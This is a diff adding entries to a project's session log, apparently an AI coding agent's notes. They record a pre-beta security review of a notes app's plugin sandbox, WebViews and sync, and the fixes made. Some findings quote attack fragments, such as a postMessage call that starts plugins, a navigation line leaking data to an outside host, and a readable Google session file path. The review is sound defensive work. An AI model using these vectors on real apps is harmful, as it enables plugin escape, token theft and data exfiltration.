@@ -22,6 +22,43 @@ Decisions confirmed with the user this round:
 Still **out of scope**: the Yjs CRDT engine (`packages/core-sync`), mobile sync,
 Dropbox/OneDrive providers.
 
+## Session 2026-09-26 (night) — security fixes for the beta (critical, high, medium): DONE
+Full write-up (findings, fixes, what is still open, what was verified how): **`securityReport.md`**. In short:
+- Phone: editor page only listens to the app (`event.source` null / `window.parent`); a random bridge key written into the page HTML
+  (`NoteEditor.tsx`, checked in `createEditorBridge`); `onShouldStartLoadWithRequest` (`allowLoad`) keeps web pages out of the editor
+  WebView; the app re-checks every path/link from the page (`safeNotePath`, new `safeVaultPath`); two file-URL WebView flags removed;
+  Google session in `expo-secure-store` (lazy `require`, file fallback for older installed builds).
+- Both apps: `<meta CSP frame-src 'none'; object-src 'none'; base-uri 'none'>` (stops a plugin frame from navigating out; verified in
+  Chromium + a real WKWebView via a Swift script); re-consent when a plugin asks for more (`PluginSettings.approved`, `reviewApprovals`,
+  `withPlugin` in `manifest.ts`); `checkPluginCss` fixed (a `"/*"`…`"*/"` pair hid `url(`); plugin styles paused while the Plugins
+  screen / delete dialogs are open (`PluginHost.pauseStyles`).
+- Desktop: fs write/remove/rename/mkdir only in `$APPCONFIG`, `~/Documents/GraniteVault` and vaults allowed at run time (`allow_vault`
+  in `lib.rs`, called by `setStoredVaultDir`, and for saved vaults at launch); Google session in the Keychain (`keyring` crate,
+  `session_*` commands). Checked in the real `tauri dev` app: the old session file moved into the Keychain, sync ran, the user's saved
+  vaults + their `.granite` are writable, `~/Library/LaunchAgents` and `~/Desktop` are not. The window itself was not driven (the user
+  declined screen access), so creating/saving a note in the real window is still to be tried by the user.
+- Live Collab 1.3.0: message type in the AES-GCM AAD; Worker rate limit `JOIN_LIMIT` (wrangler ≥ 4.36); Node relay caps. CI rebuilds its
+  `main.js` and diffs it, and runs its tests. Docs: new review rules + label.
+- Phone generated files (`editorHtml.ts`, `pluginCatalog.ts`) are git-ignored: `npm run build:editor` / `npm run ship`.
+  **`expo-secure-store` is native**: the installed APK keeps using the file until a new EAS build.
+
+## Session 2026-09-26 — pre-beta security review (the findings; fixed in the section above)
+User asked (Thai) for a full security check of plugins + connections before the beta. Findings, most severe first; the user has not yet chosen what to fix:
+1. **Phone, critical**: `apps/mobile/editor-web/main.tsx` `onMessage` accepts any `message` event with a JSON string (no `event.source` check), so a plugin frame can
+   `parent.postMessage(JSON.stringify({type:"plugins",...}))` and start code with any permissions (also `value`, `plugin-run`, ...). Fix: accept only `source === null` (RN) or `window.parent` (web preview).
+2. **Phone, critical chain**: canvas link card (`packages/canvas` `LinkCard`, `<a target=_blank>`) opens *inside* the editor WebView (`setSupportMultipleWindows={false}`, iOS loads in place);
+   that page gets `ReactNativeWebView`; `editorBridge.handle` ignores `nativeEvent.url` and `pluginVault` (App.tsx) re-checks nothing (`../config/google-session.json` readable, reply goes to that page). Fix: `onShouldStartLoadWithRequest`, check the message URL, `safeNotePath` + scheme check on the RN side.
+3. **"No network" not enforced**: a sandboxed plugin frame can `location.href = "https://x/?leak=..."` (verified in Chromium; CSP `connect-src` doesn't cover navigation) and the navigated page keeps the plugin's API (same WindowProxy).
+   A parent CSP `frame-src 'none'` blocked it and srcdoc frames still ran (Chromium). Not yet checked in WKWebView. Careful: srcdoc frames inherit the parent CSP, and Tauri's `csp` config adds script hashes (would break `'unsafe-inline'`), so use a `<meta>` with only `frame-src/object-src/base-uri`.
+4. Desktop: `csp: null` + fs capability `$HOME/**` read/write/remove (incl. `~/Library/LaunchAgents`), asset scope `$HOME/**` → any future XSS = code execution. Narrow to the vault + `$APPCONFIG`.
+5. Plugin code/manifest synced via Drive run by id with no re-consent when permissions or code change (`usePlugins.refresh`, phone `runningPlugins`). Pin a hash per device, re-ask on permission change.
+6. Medium/low: phone WebView `allowUniversalAccessFromFileURLs`/`allowFileAccessFromFileURLs`/`originWhitelist *`; plaintext refresh tokens; Live Collab relay is open (no origin check / rate limit / quota) and the type byte is not in the AAD;
+   `editor.style` CSS is app-wide (can hide permission lists / dialogs); remote images in notes load automatically; Drive names with `..` not rejected (Tauri blocks `..`, phone doesn't);
+   install counter hashes IPs without a secret salt, IPv6 inflates counts; block frames can run other plugins' `//` items and link-title fetches; `slash.ts` listener has no source check; `ui.copy` needs no gesture; WebRTC/DNS not covered by CSP;
+   minified `live-collab/main.js` can't be reviewed (need source + reproducible build in CI).
+Checked and fine: Tauri IPC not injected into subframes + invoke key; asset protocol CORS = app origin only; opener = http/https/mailto/tel; OAuth PKCE + state + loopback-only; no secrets in git history; CI uses `pull_request` without secrets;
+Live Collab crypto design (165-bit secret, AES-GCM random IV, room name as AAD); `safeNotePath`, manifest id regex; docs pages escape author text; example plugins escape note content; chip icon CSS is quoted/encoded.
+
 ## Session 2026-09-21 — phone on a real device, Drive sign-in, delete, faster sync
 State: the user runs the phone app in **Expo Go** on a Samsung phone (Mac and phone on the same Wi-Fi,
 `npx expo start -c` in `apps/mobile`). Confirmed by them: editor, sidebar, Drive connect and sync work.
